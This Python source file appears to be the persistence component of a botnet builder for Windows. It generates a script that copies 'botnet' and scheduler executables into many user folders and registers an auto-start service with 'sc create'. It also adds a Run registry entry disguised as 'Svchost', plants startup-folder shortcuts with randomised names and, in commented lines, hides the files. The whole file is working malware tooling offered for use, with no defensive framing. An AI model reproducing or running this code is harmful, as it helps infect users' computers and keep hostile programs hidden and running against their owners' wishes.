from pathlib import Path
import os, winshell, shutil
from win32com.client import Dispatch
import random
import string


def exec_locations_format(required_locations):
	executable_locations=''
	if 'HOME' in required_locations:
		executable_locations+="""
f'{Path.home()}',
"""
	if 'DESKTOP' in required_locations:
		executable_locations+="""
f'{Path.home()}\\\\Desktop',
"""

	if 'DOWNLOADS' in required_locations:
		executable_locations+="""
f'{Path.home()}\\\\Downloads',
"""

	if 'DOCUMENTS' in required_locations:
		executable_locations+="""
f'{Path.home()}\\\\Documents',
"""

	if 'PICTURES' in required_locations:
		executable_locations+="""
f'{Path.home()}\\\\Pictures',
"""

	if 'MUSIC' in required_locations:
		executable_locations+="""
f'{Path.home()}\\\\Music',
"""

	if 'VIDEOS' in required_locations:
		executable_locations+="""
f'{Path.home()}\\\\Videos',
"""
	
	if 'ROAMING' in required_locations:
		executable_locations+="""
f'{Path.home()}\\\\AppData\\\\Roaming',
"""
	return '('+executable_locations+')'

# def botnetName():
# 	return 'service'

# def schedulerHidder_Name():
# 	return 'update'

# def schedulerName():
# 	return 'WindowsUpdate'
# def extension_to_use_for_scheduler_works():
# 	return '.exe'
# botnet_name = botnetName()
# scheduler_name = schedulerName()

def make_schedulerHidder_file(os_type, botnet_name, scheduler_name, exec_fileName, exec_locations, hide_files, add_to_startup, add_to_service, add_to_registry='False'):
	if os_type=='WIN' or os_type=='WINDOWS':
		return scheduler_hidder_windows(botnet_name, scheduler_name, exec_fileName, exec_locations, hide_files, add_to_startup, add_to_service, add_to_registry)

	elif os_type=='LINUX':
		# For Linux Functions has not been implemented yet
		print()

def scheduler_hidder_windows(botnet_name, scheduler_name, exec_fileName, exec_locations, hide_files, add_to_startup, add_to_service, add_to_registry):
	
	executable_locations = exec_locations_format(exec_locations)
	startup_service_setup = """

# Add Scheduler as a service
startup_services = (
"""

	scheduler_hidder_data = """
from pathlib import Path
import os, winshell, shutil
from win32com.client import Dispatch
import random
import string

"""

	scheduler_hidder_data+=f"""
executable_locations = {executable_locations}

for i in range(len(executable_locations)):
	try:
		shutil.copy(f'{{os.getcwd()}}\\\\{scheduler_name}.exe', executable_locations[i])
		shutil.copy(f'{{os.getcwd()}}\\\\{botnet_name}.exe', executable_locations[i])
		shutil.copy(f'{{os.getcwd()}}\\\\{exec_fileName}', executable_locations[i])
	
	except:
		continue


"""

	if hide_files=='True':
		scheduler_hidder_data+=f"""
	# os.system(f'attrib +h {{executable_locations[i]}}\\\\{scheduler_name}.exe')
	# os.system(f'attrib +h {{executable_locations[i]}}\\\\{botnet_name}.exe')
	# os.system(f'attrib +h {{executable_locations[i]}}\\\\{exec_fileName}')

"""
	if add_to_service=='True':
		startup_service_setup+=f"""
	f'sc create {scheduler_name} binpath={{executable_locations[2]}}\\\\{scheduler_name}.exe type=share start=auto depend=+TDI NetBIOS',
"""

	if add_to_registry=='True':
		startup_service_setup+=f"""
	f'REG ADD "HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /V "Svchost" /t REG_SZ /F /D "{{executable_locations[3]}}\\\\{scheduler_name}.exe"',

"""

	startup_service_setup+="""
)


"""
	scheduler_hidder_data+=startup_service_setup

	if add_to_startup=='True':
		scheduler_hidder_data+=f"""
startup_directory_location = [
	f'{{Path.home()}}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup',
	f'C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup'
]

for i in range(len(startup_directory_location)):

	pad = f"{{''.join(random.choices(string.ascii_uppercase+string.digits, k = 3))}}.{{''.join(random.choices(string.ascii_uppercase+string.digits, k = 3))}}.{{''.join(random.choices(string.ascii_uppercase+string.digits, k = 3))}}"
	path = f"{{startup_directory_location[i]}}\\\\{scheduler_name}_v{{pad}}.lnk"
	target = r""+executable_locations[i]+f"\\\\{scheduler_name}.exe"
	wDir = r""+executable_locations[i]

	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(path)
	shortcut.Targetpath = target
	shortcut.WorkingDirectory = wDir
	shortcut.save()


"""
	scheduler_hidder_data+=f"""
# Write to Services & Redit
for command in startup_services:
	os.system(command)
os.system('{scheduler_name}.exe')
os.system(f'{{os.getcwd()}}\\\\sc start {scheduler_name}')

"""


# 	scheduler_hidder_data = f"""
# from pathlib import Path
# import os, winshell, shutil
# from win32com.client import Dispatch
# import random
# import string

# startup_directory_location = [
# 	f'{{Path.home()}}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup',
# 	f'C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup'
# ]

# executable_locations = {exec_locations()}

# for i in range(len(executable_locations)):
# 	try:
# 		shutil.copy(f'{{os.getcwd()}}\\\\{scheduler_name}.exe', executable_locations[i])
# 		shutil.copy(f'{{os.getcwd()}}\\\\{botnet_name}.exe', executable_locations[i])
# 		shutil.copy(f'{{os.getcwd()}}\\\\exec_cmd', executable_locations[i])
	
# 	except:
# 		continue

# 	os.system(f'attrib +h {{executable_locations[i]}}\\\\{scheduler_name}.exe')
# 	os.system(f'attrib +h {{executable_locations[i]}}\\\\{botnet_name}.exe')


# # Add Scheduler as a service
# startup_services = (
# 	f'sc create {scheduler_name} binpath={{executable_locations[2]}}\\\\{scheduler_name}.exe type=share start=auto depend=+TDI NetBIOS',
# 	f'REG ADD "HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /V "Svchost" /t REG_SZ /F /D "{{executable_locations[3]}}\\\\{scheduler_name}.exe"',
# )

# # Add to startup folder
# # desktop = winshell.desktop()

# for i in range(len(startup_directory_location)):

# 	pad = f"{{''.join(random.choices(string.ascii_uppercase+string.digits, k = 3))}}.{{''.join(random.choices(string.ascii_uppercase+string.digits, k = 3))}}.{{''.join(random.choices(string.ascii_uppercase+string.digits, k = 3))}}"
# 	path = f"{{startup_directory_location[i]}}\\\\{scheduler_name}_v{{pad}}.lnk"
# 	target = r""+executable_locations[i]+f"\\\\{scheduler_name}.exe"
# 	wDir = r""+executable_locations[i]

# 	shell = Dispatch('WScript.Shell')
# 	shortcut = shell.CreateShortCut(path)
# 	shortcut.Targetpath = target
# 	shortcut.WorkingDirectory = wDir
# 	shortcut.save()




# """

	return scheduler_hidder_data